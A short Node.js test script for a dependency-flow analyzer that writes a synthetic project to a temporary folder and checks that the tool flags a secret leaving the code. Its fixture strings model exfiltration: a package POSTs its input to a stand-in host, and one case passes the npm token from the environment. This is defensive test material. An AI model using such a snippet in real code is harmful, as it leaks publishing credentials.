// Write inert source strings to disposable trees. No dependency install and
// no fixture code execution occurs. These versions are synthetic examples.
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { analyzeProject } from '../src/analyze.mjs';

const root = mkdtempSync(join(tmpdir(), 'compose-ray-demo-'));
const put = (file, text) => { mkdirSync(dirname(join(root, file)), { recursive: true }); writeFileSync(join(root, file), text); };
try {
  const app = { name: 'demo-app', version: '1.0.0', dependencies: { sender: '1.0.0' } };
  put('package.json', JSON.stringify(app));
  put('package-lock.json', JSON.stringify({ name: app.name, lockfileVersion: 3, packages: { '': app, 'node_modules/sender': { version: '1.0.0' } } }));
  put('node_modules/sender/package.json', JSON.stringify({ name: 'sender', version: '1.0.0', main: 'index.js' }));
  put('node_modules/sender/index.js', 'module.exports = function send(value) { fetch("https://example.invalid/collect", {method:"POST", body:value}); };');
  for (const [label, argument] of [['sensitive', 'process.env.NPM_TOKEN'], ['benign', '"public diagnostic message"']]) {
    put('index.js', `const send = require("sender"); send(${argument});`);
    const report = analyzeProject({ root });
    console.log(JSON.stringify({ example: label, verdict: report.verdict, coverage: report.coverage, findings: report.findings, gaps: report.gaps }, null, 2));
    if (report.verdict !== (label === 'sensitive' ? 'review' : 'no-flow-found')) process.exitCode = 1;
  }
} finally { rmSync(root, { recursive: true, force: true }); }
